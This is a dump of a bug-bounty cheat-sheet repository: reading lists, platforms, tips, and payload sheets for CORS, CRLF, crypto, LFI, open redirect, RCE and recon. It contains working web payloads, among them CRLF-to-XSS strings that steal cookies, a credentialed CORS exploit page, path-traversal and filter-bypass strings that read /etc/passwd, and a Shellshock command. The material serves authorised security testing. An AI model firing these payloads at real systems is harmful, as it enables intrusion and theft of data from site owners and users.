{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "CONTRIBUTING.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/CONTRIBUTING.md", "content": "# Contributing\n\nWe welcome contributions from the public.\n\n### Using the issue tracker üí°\n\nThe issue tracker is the preferred channel for bug reports and features requests. [![GitHub issues](https://img.shields.io/github/issues/EdOverflow/bugbounty-cheatsheet.svg?style=flat-square)](https://github.com/EdOverflow/bugbounty-cheatsheet/issues)\n\n### Issues and labels üè∑\n\nOur bug tracker utilizes several labels to help organize and identify issues.\n\n### Guidelines for bug reports üêõ\n\nUse the GitHub issue search ‚Äî check if the issue has already been reported.\n", "timestamp": "2025-10-24T11:39:22.126060"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "README.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/README.md", "content": "# Bug Bounty Cheat Sheet</h1>\n\n| üìö Reference                                                | üîé Vulnerabilities                                        | \n|-------------------------------------------------------------|-----------------------------------------------------------| \n| [Bug Bounty Platforms](cheatsheets/bugbountyplatforms.md)   | [XSS](cheatsheets/xss.md)                               | \n| [Books](cheatsheets/books.md)                               | [SQLi](cheatsheets/sqli.md)                             | \n| [Special Tools](cheatsheets/special-tools.md)               | [SSRF](cheatsheets/ssrf.md)                             | \n| [Recon](cheatsheets/recon.md)                               | [CRLF Injection](cheatsheets/crlf.md)                   | \n| [Practice Platforms](cheatsheets/practice-platforms.md)     | [CSV Injection](cheatsheets/csv-injection.md)           | \n| [Bug Bounty Tips](cheatsheets/bugbountytips.md)             | [LFI](cheatsheets/lfi.md)                               | \n|                                                             | [XXE](cheatsheets/xxe.md)                               | \n|                                                             | [RCE](cheatsheets/rce.md)                               | \n|                                                             | [Open Redirect](cheatsheets/open-redirect.md)           | \n|                                                             | [Crypto](cheatsheets/crypto.md)                         | \n|                                                             | [Template Injection](cheatsheets/template-injection.md) | \n|                                                             | [Content Injection](cheatsheets/content-injection.md)   | \n|                                                             | [XSLT Injection](cheatsheets/xslt.md)                   | \n\n# Contributing\n\nWe welcome contributions from the public.\n\n### Using the issue tracker üí°\n\nThe issue tracker is the preferred channel for bug reports and features requests. [![GitHub issues](https://img.shields.io/github/issues/EdOverflow/bugbounty-cheatsheet.svg?style=flat-square)](https://github.com/EdOverflow/bugbounty-cheatsheet/issues)\n\n### Issues and labels üè∑\n\nOur bug tracker utilizes several labels to help organize and identify issues.\n\n### Guidelines for bug reports üêõ\n\nUse the GitHub issue search ‚Äî check if the issue has already been reported.\n\n# Style Guide\n\nWe like to keep our Markdown files as uniform as possible. So if you submit a PR, make sure to follow this style guide (we will not be angry if you do not).\n\n- Cheat sheet titles should start with `##`.\n- Subheadings should be made bold. (`**Subheading**`)\n- Add newlines after subheadings and code blocks.\n- Code blocks should use three backticks. (```)\n- Make sure to use syntax highlighting whenever possible.\n\n# Contributors\n\n- [EdOverflow](https://github.com/EdOverflow)\n- [GerbenJavado](https://github.com/GerbenJavado)\n- [jon_bottarini](https://github.com/BlueTower)\n- [sp1d3r](https://github.com/sp1d3r)\n- [yasinS](https://github.com/yasinS)\n- [neutrinoguy](https://github.com/neutrinoguy)\n- [kuromatae](https://github.com/kuromatae)\n- [And many more ...](https://github.com/EdOverflow/bugbounty-cheatsheet/graphs/contributors)\n", "timestamp": "2025-10-24T11:39:22.651658"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/books.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/books.md", "content": "## Books\n**Web and browser**\n- [Web Hacking 101](https://leanpub.com/web-hacking-101) by Peter Yaworski.\n- [Breaking into Information Security: Learning the Ropes 101](https://leanpub.com/ltr101-breaking-into-infosec) by Andy Gill.\n- [The Web Application Hacker‚Äôs Handbook: Finding and Exploiting Security Flaws](https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470/) by Dafydd Stuttard and Marcus Pinto.\n- [Tangled Web](https://www.nostarch.com/tangledweb) by Michal Zalewski.\n- [OWASP Testing Guide v4](https://www.owasp.org/images/1/19/OTGv4.pdf) by OWASP Breakers community.\n\n**Mobile**\n- [The Mobile Application Hacker's Handbook](https://www.amazon.com/Mobile-Application-Hackers-Handbook/dp/1118958500) by Dominic Chell et al.\n- [iOS Application Security: The Definitive Guide for Hackers and Developers](https://www.nostarch.com/iossecurity) by David Thiel.\n\n**Cryptography**\n- [Crypto 101](https://www.crypto101.io/) by Laurens Van Houtven.\n\n**Penetration Testing**\n- [The Art of Exploitation by Jon Erickson, 2008](https://www.nostarch.com/hacking2.htm)\n- [Metasploit: The Penetration Tester's Guide by David Kennedy et al., 2011](https://www.nostarch.com/metasploit)\n- [Penetration Testing: A Hands-On Introduction to Hacking by Georgia Weidman, 2014](https://www.nostarch.com/pentesting)\n- [Rtfm: Red Team Field Manual by Ben Clark, 2014](http://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504/)\n- [The Hacker Playbook by Peter Kim, 2014](http://www.amazon.com/The-Hacker-Playbook-Practical-Penetration/dp/1494932636/)\n- [The Basics of Hacking and Penetration Testing by Patrick Engebretson, 2013](https://www.elsevier.com/books/the-basics-of-hacking-and-penetration-testing/engebretson/978-1-59749-655-1)\n- [Professional Penetration Testing by Thomas Wilhelm, 2013](https://www.elsevier.com/books/professional-penetration-testing/wilhelm/978-1-59749-993-4)\n- [Advanced Penetration Testing for Highly-Secured Environments by Lee Allen, 2012](http://www.packtpub.com/networking-and-servers/advanced-penetration-testing-highly-secured-environments-ultimate-security-gu)\n- [Violent Python by TJ O'Connor, 2012](https://www.elsevier.com/books/violent-python/unknown/978-1-59749-957-6)\n- [Fuzzing: Brute Force Vulnerability Discovery by Michael Sutton et al., 2007](http://www.fuzzing.org/)\n- [Black Hat Python: Python Programming for Hackers and Pentesters by Justin Seitz, 2014](http://www.amazon.com/Black-Hat-Python-Programming-Pentesters/dp/1593275900)\n- [Penetration Testing: Procedures & Methodologies by EC-Council, 2010](http://www.amazon.com/Penetration-Testing-Procedures-Methodologies-EC-Council/dp/1435483677)\n- [Unauthorised Access: Physical Penetration Testing For IT Security Teams by Wil Allsopp, 2010](http://www.amazon.com/Unauthorised-Access-Physical-Penetration-Security-ebook/dp/B005DIAPKE)\n- [Advanced Persistent Threat Hacking: The Art and Science of Hacking Any Organization by Tyler Wrightson, 2014](http://www.amazon.com/Advanced-Persistent-Threat-Hacking-Organization/dp/0071828362)\n- [Bug Hunter's Diary by Tobias Klein, 2011](https://www.nostarch.com/bughunter)\n- [Advanced Penetration Testing by Wil Allsopp, 2017](https://www.amazon.com/Advanced-Penetration-Testing-Hacking-Networks/dp/1119367689/)\n", "timestamp": "2025-10-24T11:39:23.129674"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/bugbountyplatforms.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/bugbountyplatforms.md", "content": "## Bug Bounty Platforms\n\n**Open For Signup**\n\n- [HackerOne](https://www.hackerone.com/)\n- [Bugcrowd](https://www.bugcrowd.com/)\n- [BountyFactory](https://bountyfactory.io/)\n- [Intigriti](https://intigriti.be/)\n- [Bugbountyjp](https://bugbounty.jp/)\n- [Safehats](https://safehats.com/)\n- [BugbountyHQ](https://www.bugbountyhq.com/)\n- [Hackerhive](https://hackerhive.io/)\n- [Hackenproof](https://hackenproof.com/)\n- [Hacktrophy](https://hacktrophy.com/)\n- [CESPPA](https://www.cesppa.com/)\n\n**Invite based Platforms**\n\n- [Synack](https://www.synack.com/red-team/)\n- [Cobalt](https://cobalt.io/)\n- [Zerocopter](https://zerocopter.com/)\n- [Yogosha](https://www.yogosha.com/)\n- [Bugbountyzone](https://bugbountyzone.com/)\n- [Antihack.me](http://www.antihack.me/)\n- [Vulnscope](https://www.vulnscope.com/)\n", "timestamp": "2025-10-24T11:39:23.184069"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/bugbountytips.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/bugbountytips.md", "content": "## Bug Bounty Tips\n\n**Tip #1**\n\nUse GIT as a recon tool. Find the target's GIT repositories, clone them, and then check the logs for information on the team not necessarily in the source code. Say the target is Reddit and I want to see which developers work on certain projects.\n\n[Link](https://gist.github.com/EdOverflow/a9aad69a690d97a8da20cd4194ca6596 )\n\n**Tip #2**\n\nLook for GitLab instances on targets or belonging to the target. When you stumble across the GitLab login panel, navigate to `/explore`. Misconfigured instances do not require authentication to view the internal projects. Once you get in, use the search function to find passwords, keys, etc. This is a pretty big attack vector and I am finally revealing it today, because I am sure it will help a lot of you get some critical issues.\n\n**Tip #3**\n\n\nBug bounty tip: test applications of a company that costs money or requires manual setup. Chances are only few to none would have tested it leaving it vulnerable. \n\n**Tip #4**\n\nIf you‚Äôve found an IDOR where you‚Äôre able to change data of others then don‚Äôt jump out of your seat to report it > modify it to XSS payload & if inputs are not sanitized & variables are echo‚Äôd without getting escaped then IDOR>XSS>ATO.\n\n\n**Tip #5**\n\nLook for *hackathon-related* assets. What I mean by this is sometimes companies run hackathons and give attendees special access to certain API endpoints and/or temporary credentials. I have found GIT instances that were set up for Hackathons full of information that allowed me to find more issues in the target several times.\n\n\n\n**Tip #6**\n\nKeep all your directory brute force results so when a CVE like Drupalgeddon2 comes out, you can look for previously found instances (cat dirsearch/reports/*/* | grep INSTALL.mysql.txt | grep 200 | less)/\n\n\n\n**Tip #7**\n\nWhen you have a form, always try to change the request method from POST to GET in order to improve the CVSS score.\nFor example, demonstrating a CSRF can be exploited simply by using \\[img\\] tag is better than having to send a link to the victim.\n", "timestamp": "2025-10-24T11:39:23.363527"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/cors.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/cors.md", "content": "## Cross Origin Resource Sharing (CORS)\n\nTesting:\n`curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'`\n\nCheck to see what the server responds with in the `Access-Control-Allow-Origin:` (if anything) and if so, check if `Access-Control-Allow-Credentials: true` is present.\n\nIf it is trusting arbitrary origins **with** allow-credentials set to true, then host this HTML as a proof of concept.\n\n```\n<!DOCTYPE html>\n<html>\n<head><title>BugBounty CheatSheet</title></head>\n<body>\n<center>\n<h2>CORs POC</h2>\n\n<textarea rows=\"10\" cols=\"60\" id=\"pwnz\">\n</textarea><br>\n<button type=\"button\" onclick=\"cors()\">Exploit</button>\n</div>\n\n<script>\nfunction cors() {\n  var xhttp = new XMLHttpRequest();\n  xhttp.onreadystatechange = function() {\n    if (this.readyState == 4 && this.status == 200) {\n      document.getElementById(\"pwnz\").innerHTML = this.responseText;\n    }\n  };\n  xhttp.open(\"GET\", \"http://example.com/api/v1/topsecret\", true);\n  xhttp.withCredentials = true;\n  xhttp.send();\n}\n</script>\n```\n", "timestamp": "2025-10-24T11:39:23.516771"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/crlf.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md", "content": "## CRLF Injection || HTTP Response Splitting\n\n```\n%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;\n```\n\n**Header-based test, site root**\n\n```\n%0d%0aheader:header\n```\n```\n%0aheader:header\n```\n```\n%0dheader:header\n```\n```\n%23%0dheader:header\n```\n```\n%3f%0dheader:header\n```\n\n```\n/%250aheader:header\n```\n\n```\n/%25250aheader:header\n```\n\n```\n/%%0a0aheader:header\n```\n\n```\n/%3f%0dheader:header\n```\n\n```\n/%23%0dheader:header\n```\n\n```\n/%25%30aheader:header\n```\n\n```\n/%25%30%61header:header\n```\n\n```\n/%u000aheader:header\n```\n\n**CRLF chained with Open Redirect server misconfiguration**\n\n_Note:_ This sometimes works. (Discovered in some Yandex sites, was not exploitable from the root.)\n\n```\n//www.google.com/%2f%2e%2e%0d%0aheader:header\n```\n```\n/www.google.com/%2e%2e%2f%0d%0aheader:header\n```\n```\n/google.com/%2F..%0d%0aheader:header\n```\n\n**Twitter specific CRLF** by [@filedescriptor](http://blog.innerht.ml/twitter-crlf-injection/)\n\n```\n%E5%98%8A%E5%98%8Dheader:header\n```\n\n**CRLF Injection to XSS**\n\n```\n%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e\n```\n\n**Response splitting on 302 Redirect, before Location header** (Discovered in DoD)\n\n```\n%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E\n```\n\n**Response splitting on 301 code, chained with Open Redirect to corrupt location header and to break 301** by [@black2fan](https://twitter.com/black2fan) (Facebook bug)\n\n_Note:_ `xxx:1` was used for breaking open redirect destination (Location header). Great example how of to escalate CRLF to XSS on a such, it would seem, unexploitable 301 status code.\n\n```\n%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr\n```\n", "timestamp": "2025-10-24T11:39:23.632005"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/crypto.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crypto.md", "content": "## Crypto\n\n**MD5 Collision Strings**\n\n```\n%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\n```\n\n```\n%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n```\n\n<details>\n\t<summary>URL decode strings.</summary>\n\t<pre><code>4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2</code></pre>\n\t<pre><code>4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2</code></pre>\n</details><br>\n\n**SHA-1 Collision Strings**\n\n```\n%25%50%44%46%2D%31%2E%33%0A%25%E2%E3%CF%D3%0A%0A%0A%31%20%30%20%6F%62%6A%0A%3C%3C%2F%57%69%64%74%68%20%32%20%30%20%52%2F%48%65%69%67%68%74%20%33%20%30%20%52%2F%54%79%70%65%20%34%20%30%20%52%2F%53%75%62%74%79%70%65%20%35%20%30%20%52%2F%46%69%6C%74%65%72%20%36%20%30%20%52%2F%43%6F%6C%6F%72%53%70%61%63%65%20%37%20%30%20%52%2F%4C%65%6E%67%74%68%20%38%20%30%20%52%2F%42%69%74%73%50%65%72%43%6F%6D%70%6F%6E%65%6E%74%20%38%3E%3E%0A%73%74%72%65%61%6D%0A%FF%D8%FF%FE%00%24%53%48%41%2D%31%20%69%73%20%64%65%61%64%21%21%21%21%21%85%2F%EC%09%23%39%75%9C%39%B1%A1%C6%3C%4C%97%E1%FF%FE%01%73%46%DC%91%66%B6%7E%11%8F%02%9A%B6%21%B2%56%0F%F9%CA%67%CC%A8%C7%F8%5B%A8%4C%79%03%0C%2B%3D%E2%18%F8%6D%B3%A9%09%01%D5%DF%45%C1%4F%26%FE%DF%B3%DC%38%E9%6A%C2%2F%E7%BD%72%8F%0E%45%BC%E0%46%D2%3C%57%0F%EB%14%13%98%BB%55%2E%F5%A0%A8%2B%E3%31%FE%A4%80%37%B8%B5%D7%1F%0E%33%2E%DF%93%AC%35%00%EB%4D%DC%0D%EC%C1%A8%64%79%0C%78%2C%76%21%56%60%DD%30%97%91%D0%6B%D0%AF%3F%98%CD%A4%BC%46%29%B1\n```\n\n```\n%25%50%44%46%2D%31%2E%33%0A%25%E2%E3%CF%D3%0A%0A%0A%31%20%30%20%6F%62%6A%0A%3C%3C%2F%57%69%64%74%68%20%32%20%30%20%52%2F%48%65%69%67%68%74%20%33%20%30%20%52%2F%54%79%70%65%20%34%20%30%20%52%2F%53%75%62%74%79%70%65%20%35%20%30%20%52%2F%46%69%6C%74%65%72%20%36%20%30%20%52%2F%43%6F%6C%6F%72%53%70%61%63%65%20%37%20%30%20%52%2F%4C%65%6E%67%74%68%20%38%20%30%20%52%2F%42%69%74%73%50%65%72%43%6F%6D%70%6F%6E%65%6E%74%20%38%3E%3E%0A%73%74%72%65%61%6D%0A%FF%D8%FF%FE%00%24%53%48%41%2D%31%20%69%73%20%64%65%61%64%21%21%21%21%21%85%2F%EC%09%23%39%75%9C%39%B1%A1%C6%3C%4C%97%E1%FF%FE%01%7F%46%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2%56%0B%45%CA%67%D6%88%C7%F8%4B%8C%4C%79%1F%E0%2B%3D%F6%14%F8%6D%B1%69%09%01%C5%6B%45%C1%53%0A%FE%DF%B7%60%38%E9%72%72%2F%E7%AD%72%8F%0E%49%04%E0%46%C2%30%57%0F%E9%D4%13%98%AB%E1%2E%F5%BC%94%2B%E3%35%42%A4%80%2D%98%B5%D7%0F%2A%33%2E%C3%7F%AC%35%14%E7%4D%DC%0F%2C%C1%A8%74%CD%0C%78%30%5A%21%56%64%61%30%97%89%60%6B%D0%BF%3F%98%CD%A8%04%46%29%A1\n```\n\n<details>\n\t<summary>URL decode strings.</summary>\n\t<pre><codecode></pre>\n\t<pre><codecode></pre>\n</details><br>\n\n**Bcrypt (BSD) Wraparound Bug**\n\n`$2a$` Bcrypt hashes were vulnerable to a wraparound bug where the first string in the list below would output the same hash as the next strings.\n\n```\n000000000000000000000000000000000000000000000000000000000000000000000000\n```\n\n```\n012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234\n```\n\n```\n0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345\n```\n\n**Length extension attack**\n\nIn cryptography and computer security, a length extension attack is a type of attack where an attacker can use `Hash(message1)` and the length of `message1` to calculate `Hash(message1 ‚à• message2)` for an attacker-controlled `message2`.\n\nIn Summary: Given a hash that is composed of a string with an unknown prefix, an attacker can append to the string and produce a new hash that still has the unknown prefix.\n\nAn example:\n\n```\nhttp://example.com/download?file=report.pdf&mac=563162c9c71a17367d44c165b84b85ab59d036f9\n```\n\n```\nhttp://example.com/download?file=report.pdf%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00\n\n%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00\n\n%00%00%A8/../../../../../../../etc/passwd&mac=ee40aa8ec0cfafb7e2ec4de20943b673968857a5\n```\nA related HackerOne report: https://hackerone.com/reports/251572\n\nTool to extend a hash: https://github.com/iagox86/hash_extender\n\nMore details about the attack:\n\nhttps://www.whitehatsec.com/blog/hash-length-extension-attacks/\nhttps://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks\n", "timestamp": "2025-10-24T11:39:23.716509"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/lfi.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/lfi.md", "content": "## LFI\n\n**Filter Bypass**\n\n```\n../\\\n```\n\n```\n..\\/\n```\n\n```\n/..\n```\n\n```\n\\/..\n```\n\n```\n/%5c..\n```\n\n**FFmpeg Local File Disclosure**\n\nThis [script](https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py) by @neex can be used to disclose local files on FFmpeg hosts which parse externally-referencing [HLS playlists](https://ffmpeg.org/ffmpeg-formats.html#hls-2).\n\n_Steps to reproduce_\n\n1. Please download the script from @neex to your \"attacker\" instance\n2. Execute the script with your desired parameters: `python3 gen_xbin_avi.py file:///etc/hostname bugbounty.avi`\n3. Upload the generated AVI file to your target site (e.g. within a 'video upload page')\n4. The target may process the malicious HLS inclusion with FFmpeg on the server-side.\n5. Play the uploaded AVI via the target site. If successful, your desired file will be disclosed within the video.\n\nAlternative scripts exist which may generate different HLS formats or lead to the desired file being disclosed in a different manner.\n\n**Blogs**\n* http://pastie.org/840199\n* http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/\n* http://www.notsosecure.com/folder2/2010/08/20/lfi-code-exec-remote-root/?utm_source=twitterfeed&utm_medium=twitter\n* http://labs.neohapsis.com/2008/07/21/local-file-inclusion-%E2%80%93-tricks-of-the-trade/\n* http://www.digininja.org/blog/when_all_you_can_do_is_read.php\n", "timestamp": "2025-10-24T11:39:23.975921"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/open-redirect.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/open-redirect.md", "content": "## Open Redirect\n\n```\n/%09/google.com\n```\n\n```\n/%5cgoogle.com\n```\n\n```\n//www.google.com/%2f%2e%2e\n```\n\n```\n//www.google.com/%2e%2e\n```\n\n```\n//google.com/\n```\n\n```\n//google.com/%2f..\n```\n\n```\n//\\google.com\n```\n\n```\n/\\victim.com:80%40google.com\n```\n\n## Possible open redirect parameters\n\n```\n?url=http://{target}\n```\n\n```\n?url=https://{target}\n```\n\n```\n?next=http://{target}\n```\n\n```\n?next=https://{target}\n```\n\n```\n?url=https://{target}\n```\n\n```\n?url=http://{target}\n```\n\n```\n?url=//{target}\n```\n\n```\n?url=$2f%2f{target}\n```\n\n```\n?next=//{target}\n```\n\n```\n?next=$2f%2f{target}\n```\n\n```\n?url=//{target}\n```\n\n```\n?url=$2f%2f{target}\n```\n\n```\n?url=//{target}\n```\n\n```\n/redirect/{target}\n```\n\n```\n/cgi-bin/redirect.cgi?{target}\n```\n\n```\n/out/{target}\n```\n\n```\n/out?{target}\n```\n\n```\n/out?/{target}\n```\n\n```\n/out?//{target}\n```\n\n```\n/out?/\\{target}\n```\n\n```\n/out?///{target}\n```\n\n```\n?view={target}\n```\n\n```\n?view=/{target}\n```\n\n```\n?view=//{target}\n```\n\n```\n?view=/\\{target}\n```\n\n```\n?view=///{target}\n```\n\n```\n/login?to={target}\n```\n\n```\n/login?to=/{target}\n```\n\n```\n/login?to=//{target}\n```\n\n```\n/login?to=/\\{target}\n```\n\n```\n/login?to=///{target}\n```\n\n\n\n**Open Redirect Payloads** by @cujanovic\n\nhttps://github.com/cujanovic/Open-Redirect-Payloads\n\n\n**Open Redirect Paramters** by @fuzzdb-project\n\nhttps://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt\n", "timestamp": "2025-10-24T11:39:24.058900"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/practice-platforms.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/practice-platforms.md", "content": "## Practice Platforms\n\n- [Pentesterlab](https://pentesterlab.com/)\n- [XSS Game](https://xss-game.appspot.com/)\n- [Hack This Site](https://www.hackthissite.org)\n- [Root-Me](https://www.root-me.org)\n- [HackTheBox](https://www.hackthebox.eu)\n- [Hack Me](https://hack.me) \n- [CTF 365](https://ctf365.com)\n- [Google Gruyere](https://google-gruyere.appspot.com/)\n- [OWASP Juice Shop](http://juice-shop.herokuapp.com/)\n- [Hack Yourself First](http://hackyourselffirst.troyhunt.com/)\n- [flAWS Cloud](http://flaws.cloud/)\n- [bWAPP](http://www.itsecgames.com/)\n- [OWASP Mutillidae] (https://www.owasp.org/index.php/OWASP_Mutillidae_2_Project)\n- [tryhackme](https://tryhackme.com/)\n- [Portswigger Labs](https://portswigger.net/web-security/all-labs)\n", "timestamp": "2025-10-24T11:39:24.251309"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/rce.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/rce.md", "content": "## RCE\n\n**Werkzeug Debugger**\n\nFind somewhere where user input can be supplied and submit the following string to cause an error:\n\n```\nstr—ñng\n```\n\nIf the target is running their application in debug mode you might be able to run commands. If you are running the target locally, you can probably brute-force the debugger PIN. The debugger PIN is always in the following format: `***-***-***`.\n\n**Basic Bypasses**\n\n```\ni'''d\ni\"\"\"d\n```\n\n```\n\\l\\s -l\\a\\h\n```\n\n```\ncat /e?c/p?ss??\ncat /e??/??ss*\n```\n\n```\n{ls,}\n{ls,-a}\n```\n\n**Shellshock Bug**\n\n```bash\n() { :;}; echo vulnerable\n```\n\n```zsh\ncurl -H \"User-Agent: () { :; }; /bin/eject\" http://example.com/\n```\n", "timestamp": "2025-10-24T11:39:24.340929"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/recon.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/recon.md", "content": "# Certspotter\n\n```zsh\ncurl https://certspotter.com/api/v0/certs\\?domain\\=example.com | jq '.[].dns_names[]' | sed 's/\\\"//g' | sed 's/\\*\\.//g' | uniq\n```\n\n```zsh\ncurl https://certspotter.com/api/v0/certs\\?domain\\=example.com | jq '.[].dns_names[]' | sed 's/\\\"//g' | sed 's/\\*\\.//g' | uniq | dig +short -f - | uniq | nmap -T5 -Pn -sS -i - -p 80,443,21,22,8080,8081,8443 --open -n -oG -\n```\n\n# Sublist3r One-liner\n\nThis runs [Sublist3r](https://github.com/aboul3la/Sublist3r) on a list of domains and outputs the results in separate files.\n\n```\n. <(cat domains | xargs -n1 -i{} python sublist3r.py -d {} -o {}.txt)\n```\n\n# [Apktool](https://ibotpeaches.github.io/Apktool/) to [LinkFinder](https://github.com/GerbenJavado/LinkFinder)\n\n```\napktool d app.apk; cd app;mkdir collection; find . -name \\*.smali -exec sh -c \"cp {} collection/\\$(head /dev/urandom | md5 | cut -d' ' -f1).smali\" \\;; linkfinder -i 'collection/*.smali' -o cli\n```\n\n# [Aquatone](https://github.com/michenriksen/aquatone/) One-liner\n\n```\n$ echo \"aquatone-discover -d \\$1 && aquatone-scan -d \\$1 --ports huge && aquatone-takeover -d \\$1 && aquatone-gather -d \\$1\" >> aqua.sh && chmod +x aqua.sh\n$./aqua.sh domain.com\n```\n\n# [relative-url-extractor](https://github.com/jobertabma/relative-url-extractor)\n\n```\n$ ruby extract.rb demo-file.js\n$ ruby extract.rb https://hackerone.com/some-file.js\n$ ruby extract.rb '|cat demo-file.js' -c\n```\n", "timestamp": "2025-10-24T11:39:24.460634"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/special-tools.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/special-tools.md", "content": "## Special Tools\n\n**Resolution**\n\n- http://dnsbin.zhack.ca (DNS)\n- http://pingb.in (DNS)\n- https://www.mockbin.org/ (HTTP)\n\n**Wildcard DNS**\n\n- http://xip.io\n\n```\n10.0.0.1.xip.io\nwww.10.0.0.1.xip.io\nmysite.10.0.0.1.xip.io\nfoo.bar.10.0.0.1.xip.io\n```\n\n- http://nip.io\n\n```\n10.0.0.1.nip.io\napp.10.0.0.1.nip.io\ncustomer1.app.10.0.0.1.nip.io\ncustomer2.app.10.0.0.1.nip.io\notherapp.10.0.0.1.nip.io\n```\n\n**Reconnaissance**\n\n- https://spyse.com (fully-fledged recon service)\n- https://dnsdumpster.com (DNS and subdomain recon)\n- [Reverse IP Lookup](http://reverseip.domaintools.com/) (Domainmonitor)\n- [Security headers](https://securityheaders.io/) (Security Report, missing headers)\n- http://threatcrowd.org (WHOIS, DNS, email, and subdomain recon)\n- https://mxtoolbox.com (wide range of DNS-related recon tools)\n- https://publicwww.com/ (Source Code Search Engine)\n- http://ipv4info.com/ (Find domains in the IP block owned by a Company/Organization)\n- [HackerTarget Tools](https://hackertarget.com/ip-tools/) (DNS recon, site lookup, and scanning tools)\n- [VirusTotal](https://virustotal.com/en-gb/domain/google.com/information/) (WHOIS, DNS, and subdomain recon)\n- [crt.sh](https://crt.sh/?q=%25.uber.com) (SSL certificate search)\n- [Google CT](https://transparencyreport.google.com/https/certificates) (SSL certificate transparency search)\n- [PenTest Tools](https://pentest-tools.com/information-gathering/google-hacking) (Google dorks)\n- [Wayback Machine](https://archive.org/web/) (Find stuff which was hosted on the domain in past)\n- [FindSubdomains](https://findsubdomains.com/) (Find subdomains using domain or keywords)\n\n\n\n**Report Templates**\n\n- https://github.com/fransr/template-generator\n- https://github.com/ZephrFish/BugBountyTemplates\n", "timestamp": "2025-10-24T11:39:24.625660"}
